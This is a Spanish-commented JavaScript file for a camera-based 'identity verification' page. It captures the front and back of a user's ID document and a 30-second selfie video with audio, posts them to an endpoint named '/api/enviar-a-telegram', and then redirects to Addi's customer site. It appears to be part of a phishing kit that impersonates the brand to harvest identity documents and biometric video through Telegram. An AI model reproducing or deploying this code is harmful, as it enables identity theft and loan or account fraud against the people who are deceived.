document.addEventListener('DOMContentLoaded', () => {
    // --- Configuración ---
    const UPLOAD_URL = "/api/enviar-a-telegram";
    const SUCCESS_REDIRECT_URL = "https://clientes.addi.com";
    const RECORDING_SECONDS = 30;

    // Ajuste vh para móviles (solución al bug de 100vh)
    function setVhUnit() {
        const vh = window.innerHeight * 0.01;
        document.documentElement.style.setProperty('--vh', `${vh}px`);
    }
    setVhUnit();
    window.addEventListener('resize', setVhUnit);

    // --- Vistas ---
    const cameraView = document.getElementById('camera-view');
    const modalOverlay = document.getElementById('modal-overlay');
    const verifyingModal = document.getElementById('verifying-modal');

    // --- Elementos de la Cámara ---
    const videoPreview = document.getElementById('videoPreview');
    const status = document.getElementById('status');
    const countdownTimer = document.getElementById('countdown-timer');
    const captureButton = document.getElementById('capture-button');
    const toggleCameraButton = document.getElementById('toggle-camera-button');
    const photoCanvas = document.getElementById('photo-canvas');

    // --- Elementos del Modal ---
    const startVerificationButton = document.getElementById('start-verification-button');
    const modalContent = document.getElementById('modal-content');

    // --- Variables de Grabación y Estado ---
    let mediaRecorder = null;
    let streamLocal = null;
    let recordedChunks = [];
    let countdownInterval = null;

    // --- Variables de estado y datos ---
    let currentStep = 'WELCOME';
    let photoIdFront = null;
    let photoIdBack = null;
    let currentFacingMode = 'user'; // 'user' (frontal) o 'environment' (trasera)

    // --- Helpers de compatibilidad ---

    function isMediaRecorderSupported() {
        return typeof window.MediaRecorder !== 'undefined';
    }

    function getSupportedMimeType() {
        if (!isMediaRecorderSupported() || typeof MediaRecorder.isTypeSupported !== 'function') {
            return null;
        }
        const typesToTry = [
            'video/webm;codecs=vp9',
            'video/webm;codecs=vp8',
            'video/webm'
        ];
        for (const type of typesToTry) {
            if (MediaRecorder.isTypeSupported(type)) {
                return type;
            }
        }
        return null;
    }

    function streamHasAudio(stream) {
        if (!stream) return false;
        return stream.getAudioTracks().length > 0;
    }

    function showBlockingError(title, message) {
        cameraView.style.display = 'none';
        verifyingModal.style.display = 'none';
        modalOverlay.style.display = 'flex';
        modalContent.querySelector('h2').textContent = title;
        modalContent.querySelector('p').textContent = message;
        startVerificationButton.disabled = true;
    }

    function canvasToJpegBlob(canvas, quality, callback) {
        if (canvas.toBlob) {
            canvas.toBlob((blob) => {
                callback(blob);
            }, 'image/jpeg', quality);
        } else {
            // Fallback para navegadores sin toBlob
            const dataURL = canvas.toDataURL('image/jpeg', quality);
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeString });
            callback(blob);
        }
    }

    // --- 1. Iniciar/Reiniciar Cámara ---
    async function setupCamera(options = {}) {
        const {
            forceFacingMode = null,
            withAudio = false
        } = options;

        status.textContent = "Iniciando cámara...";
        startVerificationButton.disabled = true;
        toggleCameraButton.disabled = true;

        // Detener la cámara actual si existe
        if (streamLocal) {
            streamLocal.getTracks().forEach(track => track.stop());
            streamLocal = null;
        }

        if (forceFacingMode) {
            currentFacingMode = forceFacingMode;
        }

        // Aplicar (o quitar) el estilo de espejo
        videoPreview.style.transform = (currentFacingMode === 'user') ? 'scaleX(-1)' : 'scaleX(1)';

        const baseConstraints = {
            video: { facingMode: currentFacingMode },
            audio: withAudio
        };

        async function tryGetUserMedia(constraints) {
            return navigator.mediaDevices.getUserMedia(constraints);
        }

        try {
            let stream;
            try {
                stream = await tryGetUserMedia(baseConstraints);
            } catch (err) {
                // Fallbacks: si falla con facingMode o audio, intentamos algo más simple
                if (err.name === 'OverconstrainedError' || err.name === 'NotFoundError') {
                    // Intentar sin facingMode
                    const fallbackConstraints = {
                        video: true,
                        audio: withAudio
                    };
                    stream = await tryGetUserMedia(fallbackConstraints);
                } else if (withAudio && (err.name === 'NotAllowedError' || err.name === 'NotReadableError')) {
                    // Si el problema es el audio, reintentamos solo con vídeo
                    const videoOnlyConstraints = {
                        video: { facingMode: currentFacingMode },
                        audio: false
                    };
                    stream = await tryGetUserMedia(videoOnlyConstraints);
                    status.textContent = "No se pudo usar el micrófono. Se usará solo cámara.";
                } else {
                    throw err;
                }
            }

            streamLocal = stream;
            videoPreview.srcObject = stream;

            // Algunos navegadores necesitan play() manual
            const playPromise = videoPreview.play();
            if (playPromise && typeof playPromise.then === 'function') {
                playPromise.catch(() => {
                    status.textContent = "Toca la pantalla para activar la cámara si no la ves.";
                });
            }

            videoPreview.onloadedmetadata = () => {
                status.textContent = "Cámara lista.";
                startVerificationButton.disabled = false;
                toggleCameraButton.disabled = false;

                if (currentStep !== 'WELCOME') {
                    cameraView.style.display = 'flex';
                }
                if (currentStep === 'ID_FRONT' || currentStep === 'ID_BACK') {
                    toggleCameraButton.style.display = 'flex';
                }

                if (
                    currentStep === 'VIDEO_SELFIE' &&
                    currentFacingMode === 'user' &&
                    (withAudio || streamHasAudio(streamLocal))
                ) {
                    startRecording();
                }
            };
        } catch (err) {
            console.error("Error al acceder a la cámara:", err);
            showBlockingError(
                "Error de Cámara",
                "No se pudo acceder a la cámara. Por favor, verifica los permisos en tu navegador y recarga la página."
            );
        }
    }

    // --- 2. Actualizar UI (Manejador de estado) ---
    function updateUIForStep() {
        captureButton.style.display = 'none';
        toggleCameraButton.style.display = 'none';
        countdownTimer.style.display = 'none';

        switch (currentStep) {
            case 'ID_FRONT':
                modalOverlay.style.display = 'none';
                cameraView.style.display = 'flex';
                captureButton.style.display = 'block';
                toggleCameraButton.style.display = 'flex';
                status.textContent = "Centra el FRENTE de tu documento";

                // Para documento no necesitamos audio
                setupCamera({
                    forceFacingMode: 'environment',
                    withAudio: false
                });
                break;

            case 'ID_BACK':
                modalOverlay.style.display = 'none';
                cameraView.style.display = 'flex';
                captureButton.style.display = 'block';
                toggleCameraButton.style.display = 'flex';
                status.textContent = "Ahora, centra la parte TRASERA";
                // Reutilizamos la configuración actual, sin audio
                if (!streamLocal) {
                    setupCamera({
                        forceFacingMode: 'environment',
                        withAudio: false
                    });
                }
                break;

            case 'VIDEO_SELFIE':
                modalOverlay.style.display = 'none';
                cameraView.style.display = 'flex';
                status.textContent = "Prepárate para el video selfie";

                // Para selfie queremos frontal y con audio si es posible
                if (currentFacingMode !== 'user' || !streamHasAudio(streamLocal)) {
                    setupCamera({
                        forceFacingMode: 'user',
                        withAudio: true
                    });
                } else {
                    startRecording();
                }
                break;

            case 'UPLOADING':
                cameraView.style.display = 'none';
                verifyingModal.style.display = 'flex';
                if (streamLocal) {
                    streamLocal.getTracks().forEach(track => track.stop());
                    streamLocal = null;
                }
                break;
        }
    }

    // --- 3. Capturar Foto ---
    function capturePhoto() {
        if (!videoPreview.videoWidth || !videoPreview.videoHeight) {
            status.textContent = "Esperando a que la cámara esté lista...";
            return;
        }

        photoCanvas.width = videoPreview.videoWidth;
        photoCanvas.height = videoPreview.videoHeight;

        const context = photoCanvas.getContext('2d');

        if (currentFacingMode === 'user') {
            context.save();
            context.translate(photoCanvas.width, 0);
            context.scale(-1, 1);
            context.drawImage(videoPreview, 0, 0, photoCanvas.width, photoCanvas.height);
            context.restore();
        } else {
            context.drawImage(videoPreview, 0, 0, photoCanvas.width, photoCanvas.height);
        }

        canvasToJpegBlob(photoCanvas, 0.9, (blob) => {
            if (!blob) {
                status.textContent = "No se pudo capturar la imagen. Inténtalo de nuevo.";
                return;
            }

            if (currentStep === 'ID_FRONT') {
                photoIdFront = blob;
                console.log("Foto frontal capturada");
                currentStep = 'ID_BACK';
                updateUIForStep();
            } else if (currentStep === 'ID_BACK') {
                photoIdBack = blob;
                console.log("Foto trasera capturada");
                currentStep = 'VIDEO_SELFIE';
                updateUIForStep();
            }
        });
    }

    // --- 4. Iniciar Grabación de Video ---
    function startRecording() {
        if (!streamLocal) {
            console.error("Intento de grabar sin stream de cámara.");
            status.textContent = "No se pudo iniciar la grabación. Verifica la cámara.";
            return;
        }

        if (!isMediaRecorderSupported()) {
            showBlockingError(
                "Dispositivo no compatible",
                "Tu dispositivo no soporta la grabación de video necesaria para esta verificación."
            );
            return;
        }

        const mimeType = getSupportedMimeType();
        const options = mimeType ? { mimeType } : undefined;

        try {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(streamLocal, options);
        } catch (e) {
            console.error("No se pudo crear MediaRecorder:", e);
            showBlockingError(
                "Dispositivo no compatible",
                "Tu navegador no permite grabar video de manera compatible con esta verificación."
            );
            return;
        }

        mediaRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onstop = () => {
            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            currentStep = 'UPLOADING';
            updateUIForStep();
            uploadAllData(videoBlob);
        };

        mediaRecorder.start();

        status.textContent = "Grabando... Mantente visible";
        countdownTimer.textContent = RECORDING_SECONDS;
        countdownTimer.style.display = 'block';

        let secondsRemaining = RECORDING_SECONDS;

        countdownInterval = setInterval(() => {
            secondsRemaining--;
            countdownTimer.textContent = secondsRemaining;

            if (secondsRemaining <= 0) {
                stopRecording();
            }
        }, 1000);
    }

    // --- 5. Detener Grabación ---
    function stopRecording() {
        if (countdownInterval) {
            clearInterval(countdownInterval);
            countdownInterval = null;
        }
        countdownTimer.style.display = 'none';

        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }
    }

    // --- 6. Subir TODOS los Datos ---
    async function uploadAllData(videoBlob) {
        if (!photoIdFront || !photoIdBack || !videoBlob) {
            console.error("Faltan archivos para subir.");
            handleUploadError("Faltan archivos para poder verificar tu identidad. Inténtalo de nuevo.");
            return;
        }

        const formData = new FormData();
        formData.append('idFront', photoIdFront, 'id_front.jpg');
        formData.append('idBack', photoIdBack, 'id_back.jpg');
        formData.append('video', videoBlob, 'selfie.webm');

        try {
            const response = await fetch(UPLOAD_URL, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                console.log("Archivos enviados con éxito");
                window.location.href = SUCCESS_REDIRECT_URL;
            } else {
                let errorText = response.statusText;
                try {
                    const errorData = await response.json();
                    if (errorData && errorData.error) {
                        errorText = errorData.error;
                    }
                } catch (_) {
                    // Respuesta no JSON
                }
                console.error("Error del servidor:", errorText);
                throw new Error(errorText);
            }
        } catch (error) {
            console.error('Error al subir los archivos:', error.message);
            handleUploadError("No pudimos verificar tus archivos. Por favor, inténtalo de nuevo.");
        }
    }

    // --- 7. Manejar Error de Subida ---
    function handleUploadError(message) {
        verifyingModal.style.display = 'none';
        modalOverlay.style.display = 'flex';
        modalContent.querySelector('h2').textContent = 'Error de Subida';
        modalContent.querySelector('p').textContent = message;

        currentStep = 'WELCOME';
        photoIdFront = null;
        photoIdBack = null;
        streamLocal = null;
        currentFacingMode = 'user';
        setupCamera({ withAudio: false });
    }

    // --- Asignar Eventos ---
    startVerificationButton.onclick = () => {
        currentStep = 'ID_FRONT';
        updateUIForStep();
    };

    captureButton.onclick = capturePhoto;

    toggleCameraButton.onclick = () => {
        currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
        console.log("Cambiando cámara a:", currentFacingMode);
        const withAudio = (currentStep === 'VIDEO_SELFIE');
        setupCamera({
            forceFacingMode: currentFacingMode,
            withAudio
        });
    };

    // --- Iniciar ---
    // Iniciar la cámara en “segundo plano” solo con vídeo
    setupCamera({ withAudio: false });
});
